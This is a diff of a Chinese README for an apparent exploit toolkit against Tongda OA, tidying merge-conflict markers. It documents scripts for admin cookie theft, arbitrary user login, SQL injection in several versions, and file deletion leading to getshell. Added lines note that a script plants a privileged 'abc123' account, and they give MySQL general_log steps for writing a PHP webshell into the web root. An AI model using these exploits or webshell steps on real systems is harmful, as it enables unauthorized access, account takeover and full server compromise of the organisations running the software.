@@ -44,19 +44,11 @@ python TongDaOA.py
 
 密码rebeyond
 
-<<<<<<< HEAD
 ### 通达<V11.4任意用户cookie获取漏洞
 
 控制UID=1来获取admin的cookie
 
 ### 通达<V11.7任意在线用户登录漏洞
-=======
-## 通达<V11.4任意用户cookie获取漏洞
-
-控制UID=1来获取admin的cookie
-
-## 通达<V11.7任意在线用户登录漏洞
->>>>>>> 34cceb05bd3d02272cc84d9a26be3b303fed5ab5
 
 需要用户在线，检测RELOGIN
 
@@ -69,6 +61,7 @@ python TongDaOA.py
 密码rebeyond
 
 <<<<<<< HEAD
+
 ## Danger文件夹
 
 ### 通达V11.5后台SQL注入漏洞
@@ -83,7 +76,7 @@ GET方法测试`general/appbuilder/web/report/repdetail/edit?link_type=false&slo
 python TongDaOA_115sqlInjection.py
 ```
 
-输入URL，用户名/密码
+输入URL，用户名/密码，如果存在漏洞，把请求包放入sqlmap跑
 
 ### 通达V11.6任意文件删除漏洞getshell
 
@@ -107,28 +100,28 @@ python TongDaOA_117sqlInjection.py
 
 根据提示输入URL地址，以及用户名/密码
 
+会向数据中新增账户并提权`abc123:abc123@abc123`
+
+以下是获取数据库权限后的操作，举个例子：
+
+```
+# 通过数据库写webshell方法有很多:
+# select @@basedir可以查询绝对路径：C:\TDOA11.7\mysql5\
+# 那通达OA的web目录就是C:/TDOA11.7/webroot
+# select @@basedir
+# set global general_log='on';
+# SET global general_log_file='c:/TDOA11.7/webroot/aaa.php';
+# SELECT '一句话木马';
+```
+
 ### 通达<V11.9 后台SQL时间盲注漏洞
 
 此漏洞需要cookie，请先运行TongDaOA.py通过其他漏洞获取cookie
 
 在danger文件夹内运行
 
-=======
-## 通达V11.6任意文件删除漏洞getshell
-
-删除`auth.inc.php`认证文件，有风险请在授权状态下使用（任意删除文件只在11.6有）
-
-在danger文件夹内运行
-
-```
-python TongDaOA_116deleteFile.py
-```
-
-## 通达<V11.9 后台SQL时间盲注漏洞
-
-在danger文件夹内运行
-
->>>>>>> 34cceb05bd3d02272cc84d9a26be3b303fed5ab5
 ```
 python TongDaOA_119sqlInjection.py
 ```
+
+测试有漏洞后放到sqlmap跑
